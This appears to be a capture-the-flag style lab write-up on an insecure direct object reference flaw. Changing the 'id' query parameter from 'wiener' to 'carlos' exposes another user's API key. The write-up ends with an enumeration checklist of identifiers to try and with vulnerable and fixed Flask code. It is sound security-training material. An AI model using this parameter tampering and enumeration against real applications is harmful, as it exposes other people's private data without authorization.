# User ID Controlled by Request Parameter

**Difficulty:** `APPRENTICE` | **Category:** `Access Control`

---

## 🎯 Lab Goal

Exploit horizontal privilege escalation to obtain carlos's API key.

---

## 📋 Lab Description

The application exposes a horizontal privilege escalation vulnerability in the account page through predictable user ID parameters.

---

## 🔎 Reconnaissance

### Initial Access

Logged in with provided credentials:

| Field | Value |
|-------|-------|
| Username | `wiener` |
| Password | `peter` |

### Account Page Analysis

Browsed to `/my-account` and captured the request in Burp Suite:

```http
GET /my-account?id=wiener HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** Shows wiener's API key

---

## 🧪 Testing & Exploitation

### Step 1: Identify IDOR Vulnerability

Original request structure:
```
GET /my-account?id=wiener
```

🔍 **Vulnerability:** The `id` parameter directly controls which user's data is returned with no authorization check.

### Step 2: Parameter Manipulation

Modified the request to access another user's account:

**Original:**
```http
GET /my-account?id=wiener
```

**Modified:**
```http
GET /my-account?id=carlos
```

### Step 3: Extract API Key

Replayed the modified request.

**Result:** Response leaked carlos's API key! ✅

---

## 🚩 Solution

**Exploit Request:**
```http
GET /my-account?id=carlos
```

---

## 💡 Key Takeaways

### Insecure Direct Object Reference (IDOR)

Classic example of **horizontal privilege escalation**:
- User can access resources of other users at the same privilege level
- No authorization check validates ownership
- Predictable identifiers make enumeration easy

### IDOR Attack Patterns

| Parameter Type | Example | Risk |
|---------------|---------|------|
| Username | `?id=carlos` | High - Easy to guess |
| Sequential ID | `?id=123` | High - Easy to enumerate |
| GUID | `?id=uuid` | Medium - Harder but often leaked |
| Email | `?email=user@domain` | High - Often publicly known |

### Where to Look for IDOR

- Account/profile pages
- Document viewers
- Order history
- Private messages
- File downloads
- API endpoints

---

## 🛡️ Remediation

### Secure Implementation

**❌ Bad (No Authorization Check):**
```python
@app.route('/my-account')
def my_account():
    user_id = request.args.get('id')
    user = User.query.filter_by(username=user_id).first()
    return jsonify(user.to_dict())
```

**✅ Good (Proper Authorization):**
```python
@app.route('/my-account')
@login_required
def my_account():
    requested_id = request.args.get('id')
    current_user_id = session['username']
    
    # Verify ownership
    if requested_id != current_user_id:
        abort(403, "Access Denied")
    
    user = User.query.filter_by(username=requested_id).first()
    return jsonify(user.to_dict())
```

**✅ Better (Implicit Authorization):**
```python
@app.route('/my-account')
@login_required
def my_account():
    # Use session data, don't trust user input
    user = User.query.get(session['user_id'])
    return jsonify(user.to_dict())
```

### Best Practices

- ✅ **Always validate ownership** before returning data
- ✅ **Use session data** instead of user-supplied IDs when possible
- ✅ **Implement object-level authorization**
- ✅ **Use indirect references** (tokens/hashes instead of direct IDs)
- ✅ **Log unauthorized access attempts**
- ✅ **Rate limit** sensitive endpoints
- ✅ **Perform regular IDOR testing**

### Testing Checklist

```bash
# Try different user identifiers
?id=admin
?id=administrator
?id=1
?id=0
?userid=another_user

# Sequential enumeration
?id=1, ?id=2, ?id=3...

# Try null/empty
?id=
?id=null
```

---

**Status:** ✅ Solved
